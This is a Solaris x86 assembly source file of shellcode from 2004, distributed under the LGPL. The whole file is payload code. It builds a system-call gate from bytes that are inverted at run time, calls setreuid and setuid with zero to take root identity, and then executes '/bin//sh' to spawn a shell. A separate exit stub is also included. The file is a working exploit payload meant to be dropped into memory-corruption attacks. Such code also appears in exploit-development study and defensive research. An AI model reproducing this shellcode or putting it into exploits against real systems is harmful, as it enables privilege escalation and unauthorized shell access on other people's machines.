/*
 *  sol-x86-shellcode.s
 *  Copyright 2004 Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This library is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU Lesser General Public
 *  License as published by the Free Software Foundation; either
 *  version 2.1 of the License, or (at your option) any later version.
 *
 *  This library is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *  Lesser General Public License for more details.
 *
 *  You should have received a copy of the GNU Lesser General Public
 *  License along with this library; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

.global _start

_start:

syscallcode:
    pushl   $0x3cffd8ff
    pushl   $0x65
    movl    %esp,%esi
    notl    0x04(%esi)
    notb    (%esi)

setreuidcode:
    xorl    %eax,%eax
    pushl   %eax
    pushl   %eax
    movb    $0xca,%al
    call    *%esi

setuidcode:
    xorl    %eax,%eax
    pushl   %eax
    movb    $0x17,%al
    call    *%esi

exitcode:
    xorl    %eax,%eax
    pushl   %eax
    movb    $0x01,%al
    call    *%esi

# 26 bytes

shellcode:
    xorl    %eax,%eax
    pushl   %eax
    pushl   $0x68732f2f
    pushl   $0x6e69622f
    movl    %esp,%ebx
    pushl   %eax
    pushl   %ebx
    movl    %esp,%ecx
    pushl   %eax
    pushl   %ecx
    pushl   %ebx
    movb    $0x3b,%al
    call    *%esi

